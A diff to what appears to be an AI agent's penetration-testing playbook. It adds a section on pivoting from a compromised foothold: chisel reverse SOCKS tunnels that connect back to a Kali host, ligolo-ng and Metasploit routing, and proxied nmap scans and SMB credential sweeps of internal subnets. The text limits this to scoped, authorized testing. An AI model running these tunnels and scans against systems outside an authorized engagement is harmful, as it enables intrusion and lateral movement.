@@ -424,6 +424,41 @@ kali(command="ssh -D 1080 -p 2222 user@127.0.0.1 -N -f")
 kali(command="proxychains4 nxc smb DEEP_INTERNAL/24 -u USER -p 'PASSWORD' 2>/dev/null | head -20")
 ```
 
+**No SSH on the foothold? Stand up a SOCKS tunnel another way** (chisel / ligolo-ng / Metasploit):
+```
+# chisel — reverse SOCKS from a foothold with only outbound allowed (the common cluster-pod case):
+kali(command="chisel server -p 9001 --reverse &")                    # listener on Kali
+#   on the foothold (run via your RCE primitive — webshell, COPY TO PROGRAM, etc.):
+#     ./chisel client KALI_HOST:9001 R:1080:socks
+# ligolo-ng — tun-based, no proxychains needed once the route is added:
+kali(command="ligolo-proxy -selfcert -laddr 0.0.0.0:11601 &")        # agent connects back from the foothold
+# Metasploit — when MSF owns the session:
+#   meterpreter> run autoroute -s 10.150.0.0/16
+#   msf> use auxiliary/server/socks_proxy; set SRVPORT 1080; run
+```
+
+**Route scanners through the tunnel.** Prefer the built-in `kali(proxy=...)` wrap over hand-editing
+`/etc/proxychains4.conf` — it writes a throwaway config per call and leaves the loopback listener
+un-rewritten:
+```
+kali(command="nmap -sT -Pn -n --top-ports 100 10.150.0.158", proxy="socks5://127.0.0.1:1080")
+kali(command="httpx -u http://10.150.0.158:5000", proxy="127.0.0.1:1080")
+kali(command="nxc smb 10.150.0.0/24 -u USER -p 'PASSWORD' --continue-on-success", proxy="127.0.0.1:1080")
+```
+⚠ **nmap over SOCKS must be a TCP connect scan (`-sT`)** plus `-Pn -n` — a raw SYN scan (`-sS`) builds
+packets below the socket layer and cannot traverse a proxy (it silently finds nothing). UDP scans
+can't be proxied at all. Keep port sets small (`--top-ports`) — every probe is a full proxied TCP
+connect and is far slower than a direct scan.
+
+Once a service answers through the tunnel, register it HOST-QUALIFIED so the matrix attributes it
+to the pivot host (not the perimeter):
+`report(action="coverage", data={"path": "http://10.150.0.158:5000/", "host": "10.150.0.158:5000", ...})`.
+
+> Opt-in, fail-soft: a tunnel is never required to complete a scan. If no foothold yields a route,
+> document the host as a dead-end (the deep-pivot blocker accepts "unreachable") and move on — don't
+> loop retrying a direct scan that can't route. Tear tunnels down at wrap-up (they are persistence
+> artifacts); keep everything in scope.
+
 ---
 
 ### Phase 10 — Credential Dumping (with admin access)
